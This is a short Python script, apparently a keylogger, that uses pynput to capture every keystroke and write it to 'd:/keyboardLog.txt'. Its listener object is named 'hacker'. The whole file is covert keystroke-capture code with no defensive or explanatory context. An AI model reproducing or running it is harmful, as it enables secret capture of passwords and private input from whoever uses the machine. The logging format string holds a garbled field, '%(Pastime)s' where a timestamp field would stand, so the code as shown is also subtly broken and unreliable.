from pynput.keyboard import Listener
import logging

log_dir = "d:/"  # Directory of keyboardLog.txt
logging.basicConfig(filename=(log_dir + "keyboardLog.txt"), level=logging.DEBUG, format='%(Pastime)s: %(message)s')


def on_press(key):
    logging.info(str(key))


with Listener(on_press=on_press) as hacker:
    hacker.join()
